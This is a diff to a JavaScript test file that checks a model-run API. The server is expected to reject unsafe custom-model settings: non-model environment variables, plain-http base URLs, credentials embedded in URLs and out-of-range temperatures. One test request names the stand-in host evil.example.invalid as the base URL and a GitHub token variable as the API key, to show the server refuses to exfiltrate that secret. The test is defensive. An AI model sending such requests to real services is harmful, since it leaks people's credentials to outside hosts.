@@ -93,13 +93,16 @@ test("a bad custom model is a clear 4xx, with no secret disclosed", async () => 
     // The server would read the named variable and send it to the base URL:
     // only model-key variables, https (or loopback), no credentials in the URL.
     process.env.GITHUB_TOKEN_FOR_TEST = "ghp_should_never_leave";
-    const exfil = await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "https://evil.example", modelApiKeyEnv: "GITHUB_TOKEN" });
+    const exfil = await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "https://evil.example.invalid", modelApiKeyEnv: "GITHUB_TOKEN_FOR_TEST" });
     assert.equal(exfil.status, 400, "a non-model env var is refused");
     assert.match(await exfil.text(), /not a model key variable/);
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "http://models.example.com/v1" })).status, 400, "plain http only to localhost");
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelBaseUrl: "https://u:p@models.example.com/v1" })).status, 400, "no credentials in the URL");
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelTemperature: 3 })).status, 400, "temperature out of range");
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "openai:m", modelTemperature: "hot" })).status, 400, "temperature must be a number");
+    const anth = await c.post("/api/runs", { prompt: "x", model: "anthropic-api:claude-opus-4-8", modelTemperature: 0.5 });
+    assert.equal(anth.status, 400, "anthropic-api takes no temperature");
+    assert.match(await anth.text(), /no temperature/);
     delete process.env.GITHUB_TOKEN_FOR_TEST;
     // A plain built-in name is unchanged: no model available here, the run still starts.
     assert.equal((await c.post("/api/runs", { prompt: "x", model: "opus" })).status, 201);
